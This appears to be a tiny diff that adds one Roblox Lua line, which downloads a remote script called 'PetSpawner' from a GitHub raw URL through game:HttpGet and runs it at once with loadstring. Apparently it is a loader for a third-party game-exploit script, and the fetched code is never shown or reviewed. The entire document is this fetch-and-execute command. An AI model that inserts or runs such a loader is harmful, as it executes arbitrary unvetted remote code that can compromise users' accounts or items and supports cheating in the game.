@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DogWithUke/PetSpawner/main/script.lua"))()
